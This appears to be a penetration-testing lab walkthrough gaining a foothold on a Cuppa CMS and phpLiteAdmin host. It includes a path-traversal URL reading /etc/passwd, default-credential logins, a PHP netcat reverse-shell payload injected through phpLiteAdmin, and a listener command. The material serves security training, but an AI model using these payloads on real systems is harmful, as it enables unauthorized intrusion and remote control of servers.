Getting a Foothold

Getting a Foothold

# Works
1. Run NMAP scans to find open ports

2. Run dirb. Found 2 interesting directories: /administrator and /db

3. View the login page for Cuppa CMS

4. Find default credentials for Cuppa CMS (admin:admin). They work! Creds for the cuppa db is found there

5. View the login page for phpLiteAdmin. Didn't need any password! Creds for several users is found there.

6. Run Nikto scan. It specifies that /administrator and /db are interesting.

7. Try the Cuppa CMS LFI/RFI exploit on the target. It works for directory traversal!
`http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`
![949042314ae4b1bf7524940b0b4971bc.png](../../../_resources/bae7dd2683bf4ccb9129cb54a943ec1a.png)

8. Attempt RFI by using the phpLiteAmin exploit 24044.txt

9. In phpLiteAdmin, create a new database named hack.sqlite
![68ca9ee88d952ef89ffb569e85b91644.png](../../../_resources/201b13880fab438fa45c0bf354991879.png)

10. Rename hack.sqlite to hack.php
![ef6a3de0fed43f1f6569f20080780149.png](../../../_resources/7229bccd84094cb099fef3942e3ae6c8.png)

11. Add a new table to hack.php. This example named it 'hacktable' and input number of fields = 1
![914b732f5b8b02914cfa98eed5ccd7e4.png](../../../_resources/72f5a4db054a4c5faa1a798f3d4462a1.png)

12. Add a new field. This example named it 'hackfield', type 'TEXT', and Default Value is a php command for a reverse shell. The following php code uses netcat client to connect to our kali attack machine on port 1937:

`<?php echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.214 1937 >/tmp/f") ?>`

Verify that table 'hacktable' has been created
![a81cc16caaf862dbd02aae6dfef481d2.png](../../../_resources/52bd373f96e44afba3cb49a96655a51a.png)

Close-up view of the php code
![86703d1ec41ffe13d3a146539f996818.png](../../../_resources/639418bf8d484519bfcd326edbe58af0.png)

13. Verify the path where the injected php code is stored. This is the LFI. The path to this code is:
### /usr/local/databases/hack.php
![7e1e832b6a0df2f5c25e0fa5c806e19b.png](../../../_resources/1d086cf2e5f94951ac3827bf2f989bf5.png)

14. Open a netcat listener on port 1937
`nc -lvnp 1937`
![2a5ddfce2844270caf7b1a1e1e2581c0.png](../../../_resources/8ede21e0cdc44290bebf6597f4e17604.png)

15. Browse to our code by utilizing the previous Cuppa CMS exploit.
`http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../usr/local/databases/hack.php`
![0bdc65fc5cb04483a0432818de046a0d.png](../../../_resources/a15ac7f5175f4fbb96225aad3b920567.png)

16. Notice we now have a reverse shell
![cb994df4fe8482b8a61f531e18fe5ec7.png](../../../_resources/3b91b601f5644970a5beefe6f0bbdfc9.png)
